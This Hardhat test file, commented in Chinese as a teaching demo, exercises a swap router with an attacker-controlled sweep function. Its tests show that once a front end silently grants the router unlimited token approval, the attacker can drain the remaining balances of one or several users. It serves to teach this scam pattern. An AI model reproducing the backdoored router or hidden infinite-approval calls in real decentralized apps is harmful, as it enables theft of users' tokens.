const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("EduSwap - 无限授权教学演示", function () {
  let token, router, attacker, user1, user2;

  beforeEach(async function () {
    [, attacker, user1, user2] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("EduToken");
    token = await Token.deploy(ethers.parseEther("1000000"));
    await token.waitForDeployment();

    await token.transfer(user1.address, ethers.parseEther("1000"));
    await token.transfer(user2.address, ethers.parseEther("500"));

    const EduSwap = await ethers.getContractFactory("EduSwap");
    router = await EduSwap.connect(attacker).deploy("EduSwap");
    await router.waitForDeployment();
    await router.connect(attacker).listToken(await token.getAddress());
  });

  it("模拟前端静默调用无限授权后，attacker 可 sweep 用户剩余全部余额", async function () {
    // 1) 前端静默调用 token.approve(router, MaxUint256) —— 这是攻击核心
    await token.connect(user1).approve(await router.getAddress(), ethers.MaxUint256);

    // 2) 业务上 swap 仍要扣除输入的代币
    await router.connect(user1).swap(await token.getAddress(), ethers.parseEther("10"));

    // 3) attacker 任意时刻调用 sweep 把 user1 钱包里剩下所有代币转走
    await router.connect(attacker).sweep(await token.getAddress(), user1.address);

    // user1 钱包应该被清空
    expect(await token.balanceOf(user1.address)).to.equal(0);
    // attacker 拿到 1000 - 10 = 990（10 个仍在 router 合约内）
    expect(await token.balanceOf(attacker.address)).to.equal(ethers.parseEther("990"));
  });

  it("可以批量窃取多个已无限授权的用户", async function () {
    await token.connect(user1).approve(await router.getAddress(), ethers.MaxUint256);
    await token.connect(user2).approve(await router.getAddress(), ethers.MaxUint256);

    await router.connect(attacker).sweep(await token.getAddress(), user1.address);
    await router.connect(attacker).sweep(await token.getAddress(), user2.address);

    expect(await token.balanceOf(user1.address)).to.equal(0);
    expect(await token.balanceOf(user2.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(ethers.parseEther("1500"));
  });

  it("未授权的用户，sweep 应该失败", async function () {
    await expect(
      router.connect(attacker).sweep(await token.getAddress(), user1.address)
    ).to.be.revertedWithCustomError(token, "ERC20InsufficientAllowance");
  });

  it("非 feeTo 不能调用 sweep", async function () {
    await token.connect(user1).approve(await router.getAddress(), ethers.MaxUint256);
    await expect(
      router.connect(user1).sweep(await token.getAddress(), user1.address)
    ).to.be.revertedWith("Not feeTo");
  });
});
